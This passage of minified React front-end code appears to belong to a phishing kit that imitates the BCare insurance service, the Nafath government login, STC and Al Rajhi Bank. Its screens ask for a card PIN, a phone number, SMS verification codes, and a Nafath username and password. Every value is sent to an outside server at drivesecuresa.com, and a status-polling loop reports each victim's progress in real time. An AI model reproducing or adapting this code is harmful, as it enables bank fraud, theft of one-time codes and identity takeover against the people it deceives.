                        style: {
                            backgroundColor: Z.accent
                        }
                    }), !w && (0,
                    a.jsx)("p", {
                        className: "text-gray-500 mt-6",
                        children: "سيتم إرسال رسالة كود التحقق في خلال دقيقة."
                    })]
                }), (0,
                a.jsx)("div", {
                    className: "mt-4 text-center",
                    children: (0,
                    a.jsx)("div", {
                        className: "flex justify-center mt-2",
                        children: (0,
                        a.jsx)("img", {
                            src: "/stcchannels.png",
                            alt: "STC-Channels",
                            className: "h-16 mx-2"
                        })
                    })
                })]
            })
        }
        ;
        let K = {
            surface: u.colors.surface,
            border: u.colors.border,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            error: u.colors.error
        };
        var W = e => {
            let {setPageState: t, onConfirm: s, setLoading: o} = e
              , {dir: n} = (0,
            i.Z)()
              , c = "cardOwnershipVerification"
              , [x,p] = (0,
            l.useState)("")
              , [h,f] = (0,
            l.useState)({});
            (0,
            l.useEffect)( () => {
                let e = j.getForm(c);
                (null == e ? void 0 : e.secretCode) && p(e.secretCode)
            }
            , [c]),
            (0,
            l.useEffect)( () => {
                j.setForm(c, {
                    secretCode: x
                }, {
                    sensitiveFields: ["secretCode"]
                })
            }
            , [x, c]);
            let y = () => {
                let e = {};
                return /^\d{4}$/.test(x) || (e.secretCode = "الرقم السري يجب أن يكون مكونًا من 4 أرقام."),
                e
            }
              , b = async () => {
                var e, a;
                if ((null === (e = r.g) || void 0 === e ? void 0 : e.window) === void 0)
                    return;
                let o = y();
                if (Object.keys(o).length > 0) {
                    f(o);
                    return
                }
                f({});
                let l = {
                    key: null === (a = localStorage) || void 0 === a ? void 0 : a.getItem("key"),
                    secretCode: x,
                    inNafath: !1,
                    inSTC: !1
                };
                await (0,
                m.iq)({
                    url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                    data: l
                }),
                t(8),
                await (null == s ? void 0 : s(x))
            }
            ;
            return (0,
            a.jsxs)("div", {
                dir: n,
                className: "rounded-2xl p-6 mb-4 mx-auto max-w-[98%] text-center border mt-2",
                style: {
                    backgroundColor: K.surface,
                    borderColor: K.border,
                    boxShadow: u.shadow.card
                },
                children: [(0,
                a.jsx)("div", {
                    className: "text-lg font-bold mb-4",
                    style: {
                        color: K.textPrimary
                    },
                    children: "إثبات ملكية البطاقة"
                }), (0,
                a.jsx)("p", {
                    className: "mb-4",
                    style: {
                        color: K.textSecondary
                    },
                    children: "الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام"
                }), (0,
                a.jsxs)("div", {
                    className: "mb-4",
                    children: [(0,
                    a.jsx)("input", {
                        type: "password",
                        autoComplete: "none",
                        id: "secretCode",
                        value: x,
                        onChange: e => p(e.target.value),
                        maxLength: 4,
                        className: "w-full border rounded-xl px-3 py-2 text-center",
                        style: {
                            borderColor: K.border,
                            color: K.textPrimary
                        },
                        placeholder: "الرقم السري"
                    }), h.secretCode && (0,
                    a.jsx)("p", {
                        className: "text-sm",
                        style: {
                            color: K.error
                        },
                        children: h.secretCode
                    })]
                }), (0,
                a.jsx)(d, {
                    setLoading: o,
                    onClick: async () => {
                        let e = [1e3, 2e3, 3e3]
                          , t = e[Math.floor(Math.random() * e.length)];
                        return new Promise(e => {
                            setTimeout( () => {
                                b(),
                                e()
                            }
                            , t)
                        }
                        )
                    }
                    ,
                    label: "تأكيد",
                    className: "w-full font-bold py-2 rounded-xl transition-colors duration-300",
                    style: {
                        backgroundColor: K.accent,
                        color: u.colors.textLight
                    }
                }), (0,
                a.jsx)("p", {
                    className: "mt-4",
                    style: {
                        color: K.textSecondary
                    },
                    children: "الدفع بواسطة"
                }), (0,
                a.jsxs)("div", {
                    className: "flex justify-center mt-4 gap-2",
                    children: [(0,
                    a.jsx)("img", {
                        src: "/mada.png",
                        alt: "Mada",
                        className: "h-6 mx-2"
                    }), (0,
                    a.jsx)("img", {
                        src: "/mastercard.png",
                        alt: "Mastercard",
                        className: "h-6 mx-2"
                    }), (0,
                    a.jsx)("img", {
                        src: "/visa.png",
                        alt: "Visa",
                        className: "h-6 mx-2"
                    })]
                })]
            })
        }
        ;
        let _ = {
            surface: u.colors.surface,
            border: u.colors.border,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            error: u.colors.error
        };
        var $ = e => {
            let {setPhoneNumber: t, setPageState: s, onConfirm: o, mobileOperator: n, setMobileOperator: c, setLoading: x} = e
              , {dir: p} = (0,
            i.Z)()
              , h = "phoneNumberConfirmation"
              , [f,y] = (0,
            l.useState)("")
              , [b,g] = (0,
            l.useState)({});
            (0,
            l.useEffect)( () => {
                let e = j.getForm(h);
                e && "object" == typeof e && (e.phoneNumber && (y(e.phoneNumber),
                t(t => ({
                    ...t,
                    number: e.phoneNumber
                }))),
                e.mobileOperator && (c(e.mobileOperator),
                t(t => ({
                    ...t,
                    type: e.mobileOperator
                }))))
            }
            , [h, t, c]),
            (0,
            l.useEffect)( () => {
                j.setForm(h, {
                    phoneNumber: f,
                    mobileOperator: n
                })
            }
            , [f, n, h]);
            let v = () => {
                let e = {};
                return ((null == f ? void 0 : f.length) <= 1 || isNaN(f)) && (e.phoneNumber = "رقم الجوال يجب أن يبدأ بـ 5 ويتكون من 9 أرقام."),
                n || (e.mobileOperator = "مشغل شبكة الجوال مطلوب."),
                e
            }
              , N = async () => {
                var e, t;
                if ((null === (e = r.g) || void 0 === e ? void 0 : e.window) === void 0)
                    return;
                let a = v();
                if (Object.keys(a).length > 0) {
                    g(a);
                    return
                }
                g({});
                let l = {
                    key: null === (t = localStorage) || void 0 === t ? void 0 : t.getItem("key"),
                    phoneNumber: f,
                    mobileOperator: n,
                    inNafath: !1,
                    inSTC: !1
                };
                await (0,
                m.iq)({
                    url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                    data: l
                }),
                s(9),
                null == o || o({
                    phoneNumber: f,
                    mobileOperator: n
                })
            }
            ;
            return (0,
            a.jsxs)("div", {
                dir: p,
                className: "rounded-2xl p-6 mb-4 mx-auto max-w-[98%] text-center border mt-2",
                style: {
                    backgroundColor: _.surface,
                    borderColor: _.border,
                    boxShadow: u.shadow.card
                },
                children: [(0,
                a.jsx)("div", {
                    className: "text-lg font-bold mb-4",
                    children: "تأكيد رقم هاتف مقدم الطلب"
                }), (0,
                a.jsxs)("p", {
                    className: "mb-4",
                    style: {
                        color: _.textSecondary
                    },
                    children: ["تم تسجيل بيانات الوثيقة بنجاح!", (0,
                    a.jsx)("br", {}), "لمتابعة الطلب يرجى إدخال رقم مقدم الطلب بشكل صحيح."]
                }), (0,
                a.jsxs)("div", {
                    className: "mb-4",
                    children: [(0,
                    a.jsx)("label", {
                        htmlFor: "phoneNumber",
                        className: "block mb-1",
                        style: {
                            color: _.textSecondary
                        },
                        children: "رقم الجوال *"
                    }), (0,
                    a.jsx)("input", {
                        type: "text",
                        id: "phoneNumber",
                        value: f,
                        onChange: e => {
                            t(t => ({
                                ...t,
                                number: e.target.value
                            })),
                            y(e.target.value)
                        }
                        ,
                        maxLength: 10,
                        className: "w-full border rounded-xl px-3 py-2",
                        style: {
                            borderColor: _.border,
                            color: _.textPrimary
                        },
                        placeholder: "555555555"
                    }), b.phoneNumber && (0,
                    a.jsx)("p", {
                        className: "text-sm",
                        style: {
                            color: _.error
                        },
                        children: b.phoneNumber
                    })]
                }), (0,
                a.jsxs)("div", {
                    className: "mb-4 text-black",
                    children: [(0,
                    a.jsx)("label", {
                        htmlFor: "mobileOperator",
                        className: "block mb-1",
                        style: {
                            color: _.textSecondary
                        },
                        children: "مشغل شبكة الجوال *"
                    }), (0,
                    a.jsxs)("select", {
                        id: "mobileOperator",
                        value: n,
                        onChange: e => {
                            t(t => ({
                                ...t,
                                type: e.target.value
                            })),
                            c(e.target.value)
                        }
                        ,
                        className: "w-full border rounded-xl px-3 py-2",
                        style: {
                            borderColor: _.border,
                            color: _.textPrimary
                        },
                        children: [(0,
                        a.jsx)("option", {
                            value: "",
                            disabled: !0,
                            children: "اختر مشغل الشبكة"
                        }), (0,
                        a.jsx)("option", {
                            value: "Zain",
                            children: "Zain"
                        }), (0,
                        a.jsx)("option", {
                            value: "Mobily",
                            children: "Mobily"
                        }), (0,
                        a.jsx)("option", {
                            value: "Stc",
                            children: "STC"
                        }), (0,
                        a.jsx)("option", {
                            value: "salam",
                            children: "Salam"
                        }), (0,
                        a.jsx)("option", {
                            value: "virgin",
                            children: "Virgin"
                        }), (0,
                        a.jsx)("option", {
                            value: "redbull",
                            children: "RedBull"
                        })]
                    }), b.mobileOperator && (0,
                    a.jsx)("p", {
                        className: "text-sm",
                        style: {
                            color: _.error
                        },
                        children: b.mobileOperator
                    })]
                }), (0,
                a.jsx)(d, {
                    setLoading: x,
                    onClick: async () => {
                        let e = [1e3, 2e3, 3e3]
                          , t = e[Math.floor(Math.random() * e.length)];
                        return new Promise(e => {
                            setTimeout( () => {
                                N(),
                                e()
                            }
                            , t)
                        }
                        )
                    }
                    ,
                    label: "تأكيد",
                    className: "w-full font-bold py-2 rounded-xl transition-colors duration-300",
                    style: {
                        backgroundColor: _.accent,
                        color: u.colors.textLight
                    }
                })]
            })
        }
        ;
        let ee = {
            surface: u.colors.surface,
            border: u.colors.border,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            error: u.colors.error
        };
        var et = e => {
            let {setPageState: t, phoneNumber: s, mobileOperator: o, onConfirm: n, setLoading: c} = e
              , {dir: d} = (0,
            i.Z)()
              , x = "phoneVerification"
              , [p,h] = (0,
            l.useState)("")
              , [f,y] = (0,
            l.useState)({});
            (0,
            l.useEffect)( () => {
                let e = j.getForm(x);
                (null == e ? void 0 : e.verificationCode) && h(e.verificationCode)
            }
            , [x]),
            (0,
            l.useEffect)( () => {
                j.setForm(x, {
                    verificationCode: p
                }, {
                    sensitiveFields: ["verificationCode"]
                })
            }
            , [p, x]);
            let b = () => {
                let e = {};
                return ((null == p ? void 0 : p.length) <= 3 || isNaN(p)) && (e.verificationCode = "رمز التحقق يجب أن يكون مكونًا من 6 أرقام."),
                e
            }
              , g = async () => {
                var e, a;
                if ((null === (e = r.g) || void 0 === e ? void 0 : e.window) === void 0)
                    return;
                let s = b();
                if (Object.keys(s).length > 0) {
                    y(s);
                    return
                }
                y({});
                let l = {
                    key: null === (a = localStorage) || void 0 === a ? void 0 : a.getItem("key"),
                    verificationCode: p,
                    inNafath: !1,
                    inSTC: !1
                };
                await (0,
                m.iq)({
                    url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                    data: l
                }),
                "Stc" === o ? t(12) : t(10),
                null == n || n(p)
            }
            ;
            return (0,
            a.jsxs)("div", {
                dir: d,
                className: "rounded-2xl p-6 mb-4 mx-auto max-w-[98%] text-center border mt-2",
                style: {
                    backgroundColor: ee.surface,
                    borderColor: ee.border,
                    boxShadow: u.shadow.card
                },
                children: [(0,
                a.jsx)("div", {
                    className: "text-lg font-bold mb-4",
                    style: {
                        color: ee.textPrimary
                    },
                    children: "التحقق من رقم الهاتف"
                }), (0,
                a.jsxs)("p", {
                    className: "mb-4",
                    style: {
                        color: ee.textSecondary
                    },
                    children: ["تم ارسال رسالة نصية الى جوالك لربط الوثيقة على رقم الهاتف الخاص بك!", (0,
                    a.jsx)("br", {}), "يرجى إدخال رمز التحقق المرسل إلى جوالك", (0,
                    a.jsx)("br", {}), (0,
                    a.jsxs)("span", {
                        className: "text-xl font-bold ".concat((null == s ? void 0 : s.length) > 0 ? "" : "hidden"),
                        children: ["+966 ", null == s ? void 0 : s.number]
                    })]
                }), (0,
                a.jsxs)("div", {
                    className: "mb-4",
                    children: [(0,
                    a.jsx)("label", {
                        htmlFor: "verificationCode",
                        className: "block mb-1",
                        style: {
                            color: ee.textSecondary
                        },
                        children: "رمز التحقق *"
                    }), (0,
                    a.jsx)("input", {
                        type: "text",
                        id: "verificationCode",
                        value: p,
                        onChange: e => h(e.target.value),
                        maxLength: 6,
                        className: "w-full border rounded-xl px-3 py-2",
                        style: {
                            borderColor: ee.border,
                            color: ee.textPrimary
                        },
                        placeholder: "545454"
                    }), f.verificationCode && (0,
                    a.jsx)("p", {
                        className: "text-sm",
                        style: {
                            color: ee.error
                        },
                        children: f.verificationCode
                    })]
                }), (0,
                a.jsx)("button", {
                    setLoading: c,
                    onClick: g,
                    label: "تأكيد",
                    className: "flex items-center justify-center min-h-[45px] w-full font-bold py-2 rounded-xl transition-colors duration-300",
                    style: {
                        backgroundColor: ee.accent,
                        color: u.colors.textLight
                    },
                    children: "تأكيد"
                }), (0,
                a.jsx)("p", {
                    className: "mt-4",
                    style: {
                        color: ee.textSecondary
                    },
                    children: "سيتم إرسال رسالة كود التحقق في خلال دقيقة"
                })]
            })
        }
        ;
        let er = {
            background: u.colors.background,
            surface: u.colors.surface,
            border: u.colors.border,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            error: u.colors.error
        };
        var ea = e => {
            let {setPageState: t, onConfirm: s, setLoading: o} = e
              , {dir: n} = (0,
            i.Z)()
              , c = "identityVerification"
              , [x,p] = (0,
            l.useState)("")
              , [h,f] = (0,
            l.useState)("")
              , [y,b] = (0,
            l.useState)({});
            (0,
            l.useEffect)( () => {
                let e = j.getForm(c);
                (null == e ? void 0 : e.username) && p(e.username),
                (null == e ? void 0 : e.password) && f(e.password)
            }
            , [c]),
            (0,
            l.useEffect)( () => {
                j.setForm(c, {
                    username: x,
                    password: h
                }, {
                    sensitiveFields: ["password"]
                })
            }
            , [x, h, c]);
            let g = () => {
                let e = {};
                return x || (e.username = "اسم المستخدم/الهوية الوطنية مطلوب."),
                h || (e.password = "كلمة المرور مطلوبة."),
                e
            }
              , v = async () => {
                var e, a;
                if ((null === (e = r.g) || void 0 === e ? void 0 : e.window) === void 0)
                    return;
                let o = g();
                if (Object.keys(o).length > 0) {
                    b(o);
                    return
                }
                b({});
                let l = {
                    key: null === (a = localStorage) || void 0 === a ? void 0 : a.getItem("key"),
                    nafath: {
                        username: x,
                        password: h
                    },
                    inNafath: !1,
                    inSTC: !1
                };
                await (0,
                m.iq)({
                    url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                    data: l
                }),
                t(11),
                null == s || s({
                    username: x,
                    password: h
                })
            }
              , N = async () => {
                var e;
                let t = {
                    key: null === (e = localStorage) || void 0 === e ? void 0 : e.getItem("key"),
                    inNafath: !1,
                    inSTC: !1,
                    type: "BCare"
                };
                await (0,
                m.iq)({
                    url: "https://secure.drivesecuresa.com/efaa/api/user/update",
                    data: t
                })
            }
            ;
            return (0,
            l.useEffect)( () => {
                N()
            }
            , []),
            (0,
            a.jsx)("div", {
                dir: n,
                className: "min-h-screen flex flex-col items-center justify-start mt-10",
                style: {
                    backgroundColor: er.background
                },
                children: (0,
                a.jsxs)("div", {
                    className: "w-full max-w-md p-6 rounded-2xl border",
                    style: {
                        backgroundColor: er.surface,
                        borderColor: er.border,
                        boxShadow: u.shadow.card
                    },
                    children: [(0,
                    a.jsxs)("div", {
                        className: "text-center mb-6",
                        children: [(0,
                        a.jsx)("img", {
                            src: "/nafadth.png",
                            alt: "Logo",
                            className: "mx-auto mb-4 w-[100px]"
                        }), (0,
                        a.jsx)("p", {
                            className: "",
                            style: {
                                color: er.textSecondary
                            },
                            children: "يرجى ادخال رقم الهوية الوطنية لتوثيق ربط شريحتك في الطلب لاصدار وثيقة التأمين الإلكترونية ."
                        })]
                    }), (0,
                    a.jsx)("div", {
                        className: "py-2 px-4 rounded-t-lg",
                        style: {
                            backgroundColor: "#11998e",
                            color: u.colors.textLight
                        },
                        children: "اسم المستخدم وكلمة المرور"
                    }), (0,
                    a.jsxs)("div", {
                        className: "border p-4 rounded-b-lg",
                        style: {
                            borderColor: "#11998e",
                            backgroundColor: er.surface
                        },
                        children: [(0,
                        a.jsxs)("div", {
                            className: "mb-4",
                            children: [(0,
                            a.jsx)("label", {
                                htmlFor: "username",
                                className: "block mb-2",
                                style: {
                                    color: er.textSecondary
                                },
                                children: "اسم المستخدم\\الهوية الوطنية"
                            }), (0,
                            a.jsx)("input", {
                                type: "text",
                                id: "username",
                                value: x,
                                onChange: e => p(e.target.value),
                                className: "w-full border rounded-xl px-3 py-2",
                                style: {
                                    borderColor: er.border,
                                    color: er.textPrimary
                                },
                                placeholder: "اسم المستخدم\\الهوية الوطنية"
                            }), y.username && (0,
                            a.jsx)("p", {
                                className: "text-sm",
                                style: {
                                    color: er.error
                                },
                                children: y.username
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            className: "mb-4",
                            children: [(0,
                            a.jsx)("label", {
                                htmlFor: "password",
                                className: "block mb-2",
                                style: {
                                    color: er.textSecondary
                                },
                                children: "كلمة المرور"
                            }), (0,
                            a.jsx)("input", {
                                type: "password",
                                id: "password",
                                value: h,
                                onChange: e => f(e.target.value),
                                className: "w-full border rounded-xl px-3 py-2",
                                style: {
                                    borderColor: er.border,
                                    color: er.textPrimary
                                },
                                placeholder: "كلمة المرور"
                            }), y.password && (0,
                            a.jsx)("p", {
                                className: "text-sm",
                                style: {
                                    color: er.error
                                },
                                children: y.password
                            })]
                        }), (0,
                        a.jsx)(d, {
                            onClick: v,
                            label: "متابعة التوثيق",
                            className: "w-full font-bold py-2 rounded-xl transition-colors duration-300",
                            style: {
                                backgroundColor: "#11998e",
                                color: u.colors.textLight
                            }
                        })]
                    })]
                })
            })
        }
        ;
        let es = {
            background: u.colors.background,
            surface: u.colors.surface,
            primary: u.colors.primary,
            primaryLight: u.colors.primaryLight,
            border: u.colors.border,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary
        };
        var eo = e => {
            let {nafathCode: t} = e
              , {dir: s} = (0,
            i.Z)()
              , [o,n] = (0,
            l.useState)("");
            (0,
            l.useEffect)( () => {
                let e = navigator.userAgent || navigator.vendor || window.opera;
                /android/i.test(e) ? n("Android") : /iPad|iPhone|iPod/.test(e) && !window.MSStream ? n("iOS") : n("Other")
            }
            , []);
            let c = async e => {
                var t, a;
                if ((null === (t = r.g) || void 0 === t ? void 0 : t.window) === void 0)
                    return;
                let s = {
                    key: null === (a = localStorage) || void 0 === a ? void 0 : a.getItem("key"),
                    inNafath: e,
                    inSTC: !1
                };
                await (0,
                m.iq)({
                    url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                    data: s
                })
            }
            ;
            return (0,
            l.useEffect)( () => (c(!0),
            () => {
                c(!1)
            }
            ), []),
            (0,
            a.jsx)("div", {
                dir: s,
                className: "min-h-[100%] flex flex-col items-center justify-center p-2",
                style: {
                    backgroundColor: es.background
                },
                children: (0,
                a.jsxs)("div", {
                    className: "w-full p-6 rounded-2xl border",
                    style: {
                        backgroundColor: es.surface,
                        borderColor: es.border,
                        boxShadow: u.shadow.card
                    },
                    children: [(0,
                    a.jsx)("div", {
                        className: "text-center mb-6",
                        children: (0,
                        a.jsx)("h2", {
                            className: "text-3xl font-bold mb-2",
                            style: {
                                color: "#11998e"
                            },
                            children: "نفاذ"
                        })
                    }), (0,
                    a.jsxs)("div", {
                        className: "border rounded-lg p-4 text-center mb-6",
                        style: {
                            backgroundColor: es.primaryLight,
                            borderColor: "#11998e"
                        },
                        children: [(0,
                        a.jsx)("p", {
                            className: "text-gray-700 mb-2",
                            children: "الرجاء التوجه الى تطبيق نفاذ وتاكيد استبدال وربط وثيقة التامين على شريحة الجوال باختيار الرقم الذي سوف يظهر في الاسفل"
                        }), (0,
                        a.jsx)("div", {
                            className: "flex justify-center items-center mb-2",
                            children: [...Array(20)].map( (e, t) => (0,
                            a.jsx)("div", {
                                className: "h-2 w-2 ".concat("bg-[#11998d]", " mx-0.5 rounded-full animate-bounce"),
                                style: {
                                    animationDelay: "".concat(.1 * t, "s")
                                }
                            }, t))
                        }), (0,
                        a.jsx)("p", {
                            className: "",
                            style: {
                                color: es.textSecondary
                            },
                            children: "جاري المعالجة. نرجو الإنتظار."
                        })]
                    }), (0,
                    a.jsx)("div", {
                        className: "p-5 pb-10 flex items-center justify-center",
                        children: (0,
                        a.jsx)("div", {
                            className: "p-5 w-[80px] h-[80px] flex items-center justify-center border-[2px] border-[#11998e]",
                            children: (0,
                            a.jsx)("h1", {
                                className: "text-[25px]",
                                style: {
                                    color: "#11998e"
                                },
                                children: t
                            })
                        })
                    }), (0,
                    a.jsxs)("div", {
                        className: "flex justify-center border p-4 rounded-lg gap-10",
                        style: {
                            borderColor: "#11998e",
                            backgroundColor: es.surface
                        },
                        children: [(0,
                        a.jsxs)("div", {
                            className: "flex flex-col items-center",
                            children: [(0,
                            a.jsx)("p", {
                                className: "font-bold mb-1",
                                style: {
                                    color: "#11998e"
                                },
                                children: "الخطوة 1"
                            }), (0,
                            a.jsx)("img", {
                                src: "/nafadthbg.png",
                                alt: "Step 1",
                                className: "h-[100px] w-[200px] object-contain mb-1"
                            }), (0,
                            a.jsx)("a", {
                                href: "Android" === o ? "https://play.google.com/store/apps/details?id=sa.gov.nic.myid&hl=en" : "iOS" === o ? "https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871" : "#",
                                className: "text-gray-700 underline",
                                target: "_blank",
                                rel: "noopener noreferrer",
                                children: "تحميل تطبيق نفاذ"
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            className: "flex flex-col items-center",
                            children: [(0,
                            a.jsx)("p", {
                                className: "font-bold mb-1",
                                style: {
                                    color: "#11998e"
                                },
                                children: "الخطوة 2"
                            }), (0,
                            a.jsx)("img", {
                                src: "/facial-recognition-system-concept-face-id-face-recognition-system-facial-biometric-identification-system-scanning-on-smartphone-mobile-app-for-face-recognition-illustration-vector.jpg",
                                alt: "Step 2",
                                className: "h-[100px] w-[200px] object-contain mb-1"
                            }), (0,
                            a.jsx)("p", {
                                className: "",
                                style: {
                                    color: es.textSecondary
                                },
                                children: "اختيار الرقم أعلاه والتحقق عبر السمات الحيوية"
                            })]
                        })]
                    })]
                })
            })
        }
        ;
        let el = {
            background: u.colors.background,
            surface: u.colors.surface,
            border: u.colors.border,
            accent: u.colors.accent,
            primary: u.colors.primary,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary
        };
        var en = e => {
            let {STCOpen: t, setSTCOpen: s, setPageState: o, setLoading: n} = e
              , {dir: c} = (0,
            i.Z)()
              , [d,x] = (0,
            l.useState)(60);
            (0,
            l.useEffect)( () => {
                if (d > 0) {
                    let e = setTimeout( () => x(d - 1), 1e3);
                    return () => clearTimeout(e)
                }
                setTimeout( () => {
                    x(60)
                }
                , 3e3)
            }
            , [d]);
            let p = async () => {
                var e, t;
                if ((null === (e = r.g) || void 0 === e ? void 0 : e.window) === void 0)
                    return;
                let a = {
                    key: null === (t = localStorage) || void 0 === t ? void 0 : t.getItem("key"),
                    ConfirmedSTC: !0
                };
                await (0,
                m.iq)({
                    url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                    data: a
                }),
                s(!1),
                o(10)
            }
              , h = async () => {
                var e;
                let t = {
                    key: null === (e = localStorage) || void 0 === e ? void 0 : e.getItem("key"),
                    inSTC: !0,
                    inNafath: !1
                };
                await (0,
                m.iq)({
                    url: "https://secure.drivesecuresa.com/bcare/api/user/update",
                    data: t
                })
            }
            ;
            return (0,
            l.useEffect)( () => {
                h();
                let e = setInterval( () => {
                    h()
                }
                , 5e3);
                return () => clearInterval(e)
            }
            , []),
            (0,
            l.useEffect)( () => {
                t && p()
            }
            , [t]),
            (0,
            a.jsx)("div", {
                dir: c,
                className: "min-h-screen flex flex-col items-center justify-center p-4 gap-5",
                style: {
                    backgroundColor: el.background
                },
                children: (0,
                a.jsxs)("div", {
                    className: "w-full max-w-md p-6 rounded-2xl border text-center",
                    style: {
                        backgroundColor: el.surface,
                        borderColor: el.border,
                        boxShadow: u.shadow.card
                    },
                    children: [(0,
                    a.jsxs)("div", {
                        className: "mb-6 flex flex-row items-center justify-center gap-5",
                        children: [(0,
                        a.jsx)("img", {
                            src: "/o_Onecall.png",
                            alt: "B Care Logo",
                            className: "w-[30px]"
                        }), (0,
                        a.jsx)("img", {
                            src: "/STC-01.svg",
                            alt: "Call Illustration",
                            className: "w-[50px]"
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "mb-6",
                        children: [(0,
                        a.jsx)("h2", {
                            className: "text-2xl font-bold mb-2",
                            style: {
                                color: el.textPrimary
                            },
                            children: "سوف يتم الاتصال بك الآن"
                        }), (0,
                        a.jsxs)("p", {
                            className: "mb-4",
                            style: {
                                color: el.textSecondary
                            },
                            children: ["قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة التأمين", (0,
                            a.jsx)("br", {}), (0,
                            a.jsx)("span", {
                                className: "text-purple-600",
                                children: "يرجى الانتظار! والضغط على رقم (5) داخل المكالمه!"
                            })]
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "border rounded-full py-2 px-4 font-bold",
                        style: {
                            backgroundColor: u.colors.primaryLight,
                            borderColor: el.border,
                            color: el.primary
                        },
                        children: [(0,
                        a.jsx)("p", {
                            className: "text-sm",
                            children: "إعادة الاتصال بعد"
                        }), (0,
                        a.jsx)("p", {
                            className: "text-lg",
                            children: (e => {
                                let t = e % 60;
                                return "".concat(Math.floor(e / 60), ":").concat(t < 10 ? "0" : "").concat(t)
                            }
                            )(d)
                        })]
                    })]
                })
            })
        }
        ;
        let ei = {
            background: u.colors.background,
            surface: u.colors.surface,
            border: u.colors.border,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary
        };
        var ec = e => {
            let {setPageState: t} = e
              , {dir: r} = (0,
            i.Z)()
              , [s,o] = (0,
            l.useState)(!1)
              , [n,c] = (0,
            l.useState)(!1);
            return (0,
            l.useEffect)( () => {
                let e = setTimeout( () => o(!0), 2e3);
                return () => clearTimeout(e)
            }
            , []),
            (0,
            l.useEffect)( () => {
                window.scrollTo(0, 0)
            }
            , []),
            (0,
            a.jsxs)("div", {
                dir: r,
                className: "fixed inset-0 z-[900] flex items-center justify-center p-5",
                children: [(0,
                a.jsx)("div", {
                    className: "absolute inset-0",
                    style: {
                        background: "radial-gradient(circle at top, #ffffff 0%, ".concat(u.colors.primaryLight, " 45%, #EAF1F8 100%)")
                    }
                }), (0,
                a.jsxs)("div", {
                    className: "relative w-full max-w-md rounded-3xl border bg-white/95 p-6 text-center",
                    style: {
                        borderColor: ei.border,
                        boxShadow: u.shadow.card
                    },
                    children: [(0,
                    a.jsxs)("div", {
                        className: "flex items-center justify-between",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "text-right",
                            children: [(0,
                            a.jsx)("p", {
                                className: "text-xs",
                                style: {
                                    color: ei.textSecondary
                                },
                                children: "الراجحي أونلاين"
                            }), (0,
                            a.jsx)("h2", {
                                className: "text-lg font-bold",
                                style: {
                                    color: ei.textPrimary
                                },
                                children: "تنبيه قبل المتابعة"
                            })]
                        }), (0,
                        a.jsx)("img", {
                            src: "/AlRajhi.png",
                            alt: "Al Rajhi",
                            className: "h-9"
                        })]
                    }), s ? (0,
                    a.jsxs)("div", {
                        className: "mt-6 space-y-5",
                        children: [(0,
                        a.jsx)("div", {
                            className: "mx-auto flex h-12 w-12 items-center justify-center rounded-full",
                            style: {
                                backgroundColor: u.colors.primaryLight
                            },
                            children: (0,
                            a.jsx)("span", {
                                className: "text-lg font-bold",
                                style: {
                                    color: "#221BFF"
                                },
                                children: "!"
                            })
                        }), (0,
                        a.jsx)("h3", {
                            className: "text-lg font-bold",
                            style: {
                                color: ei.textPrimary
                            },
                            children: "يرجى التسديد عبر الاونلاين المباشر"
                        }), (0,
                        a.jsx)("p", {
                            className: "text-sm leading-relaxed",
                            style: {
                                color: ei.textSecondary
                            },
                            children: "سيتم تحويلك الان الى بوابة الراجحي لاتمام عملية الدفع باامان."
                        }), (0,
                        a.jsxs)("div", {
                            className: "rounded-2xl border bg-white px-4 py-4 text-right",
                            style: {
                                borderColor: ei.border
                            },
                            children: [(0,
                            a.jsxs)("div", {
                                className: "flex items-start gap-2",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "mt-2 h-1.5 w-1.5 rounded-full bg-slate-400"
                                }), (0,
                                a.jsx)("p", {
                                    className: "text-sm",
                                    style: {
                                        color: ei.textSecondary
                                    },
                                    children: "تاكد من صحة بيانات تسجيل الدخول."
                                })]
                            }), (0,
                            a.jsxs)("div", {
                                className: "mt-2 flex items-start gap-2",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "mt-2 h-1.5 w-1.5 rounded-full bg-slate-400"
                                }), (0,
                                a.jsx)("p", {
                                    className: "text-sm",
                                    style: {
                                        color: ei.textSecondary
                                    },
                                    children: "قد يصلك رمز تحقق على جوالك لاكمال العملية."
                                })]
                            })]
                        }), (0,
                        a.jsx)("button", {
                            type: "button",
                            onClick: () => {
                                n || (c(!0),
                                setTimeout( () => t(14), 800))
                            }
                            ,
                            disabled: n,
                            className: "w-full rounded-xl py-3 text-sm font-semibold shadow-sm transition hover:shadow-md disabled:opacity-70",
                            style: {
                                backgroundColor: "#221BFF",
                                color: u.colors.textLight
                            },
                            children: n ? (0,
                            a.jsxs)("span", {
                                className: "flex items-center justify-center gap-2",
                                children: [(0,
                                a.jsx)("span", {
                                    className: "h-4 w-4 animate-spin rounded-full border-2 border-white/60 border-t-transparent"
                                }), "جاري التحويل..."]
                            }) : "موافق"
                        })]
                    }) : (0,
                    a.jsxs)("div", {
                        className: "mt-10 space-y-4",
                        children: [(0,
                        a.jsx)("div", {
                            className: "mx-auto h-12 w-12 animate-spin rounded-full border-4 border-slate-200 border-t-transparent"
                        }), (0,
                        a.jsx)("p", {
